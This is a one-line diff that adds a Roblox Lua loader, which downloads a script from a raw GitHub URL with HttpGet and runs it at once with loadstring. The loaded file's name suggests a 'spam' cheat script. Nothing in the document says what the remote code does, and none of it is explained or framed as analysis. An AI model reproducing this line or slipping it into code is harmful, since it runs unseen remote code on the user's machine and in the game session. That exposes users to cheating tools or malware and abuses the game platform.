@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/upd-8-cvr-retro-spam4-bgre4einif77dj.lua"))()
